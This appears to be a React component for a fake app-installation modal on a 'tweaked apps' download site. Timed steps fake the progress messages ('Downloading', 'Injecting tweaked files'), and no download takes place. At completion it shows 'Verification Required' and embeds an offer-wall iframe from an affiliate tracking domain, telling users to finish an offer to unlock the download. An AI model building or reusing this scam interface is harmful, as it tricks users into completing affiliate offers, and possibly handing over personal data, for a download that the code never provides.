
'use client';

import { useState, useEffect } from 'react';
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from '@/components/ui/dialog';
import { Progress } from './ui/progress';
import type { Entity } from '@/lib/apps';
import Image from 'next/image';

type InstallationModalProps = {
  app: Entity | null;
  onClose: () => void;
};

export function InstallationModal({ app, onClose }: InstallationModalProps) {
  const [progress, setProgress] = useState(0);
  const [status, setStatus] = useState('Initializing...');

  useEffect(() => {
    if (app) {
      setProgress(0);
      setStatus('Initializing...');
      const timers: NodeJS.Timeout[] = [];

      timers.push(
        setTimeout(() => {
          setProgress(25);
          setStatus('Connecting to server...');
        }, 1000)
      );
      timers.push(
        setTimeout(() => {
          setProgress(50);
          setStatus(`Downloading ${app.name}...`);
        }, 2500)
      );
      timers.push(
        setTimeout(() => {
          setProgress(75);
          setStatus('Injecting tweaked files...');
        }, 4000)
      );
      timers.push(
        setTimeout(() => {
          setProgress(100);
          setStatus('Installation complete!');
        }, 5500)
      );

      return () => {
        timers.forEach(clearTimeout);
      };
    }
  }, [app]);

  if (!app) {
    return null;
  }
  
  const isComplete = progress === 100;

  return (
    <Dialog open={!!app} onOpenChange={(open) => !open && onClose()}>
      <DialogContent className="sm:max-w-[425px] p-0">
        <DialogHeader className="p-6 pb-0">
          <div className="flex justify-center mb-4">
            <div className="relative w-20 h-20 aspect-square">
              <Image
                src={app.media.icon}
                alt={`${app.name} installation icon`}
                fill
                sizes="20vw"
                className="rounded-xl object-contain"
                data-ai-hint={app.media.iconHint}
                unoptimized={app.media.unoptimized}
                blurDataURL={app.media.blurDataURL}
                placeholder="blur"
              />
            </div>
          </div>
          <DialogTitle className="text-2xl text-center font-headline">
            {isComplete ? 'Verification Required' : `Installing ${app.name}`}
          </DialogTitle>
          <DialogDescription className="text-center">
            {isComplete ? `To finish installing ${app.name}, please complete the final step.` : 'Your download will begin shortly.'}
          </DialogDescription>
        </DialogHeader>
        <div className="grid gap-4 py-4 px-6">
          {!isComplete && (
            <>
              <div className="space-y-2">
                <Progress value={progress} className="w-full" />
                <p className="text-sm text-muted-foreground text-center">{status}</p>
              </div>
              <div className="text-sm text-center text-muted-foreground space-y-2 rounded-lg border p-4">
                  <p>Please wait while we prepare your app. This may take a moment.</p>
              </div>
            </>
          )}
        </div>
        {isComplete && (
          <div className="flex flex-col h-[480px]">
            <div className="p-4 text-center text-sm text-muted-foreground border-b">
              <p>Pick any offer, finish it in 1–2 minutes, and your download unlocks right away. Works on iOS & Android—no jailbreak or root</p>
            </div>
            <div className="flex-1 w-full overflow-hidden">
                <iframe
                    src="https://epctrk.com/Verify4ow"
                    scrolling="no"
                    marginWidth={0}
                    marginHeight={0}
                    frameBorder="0"
                    width="100%"
                    height="100%"
                >
                </iframe>
            </div>
          </div>
        )}
      </DialogContent>
    </Dialog>
  );
}
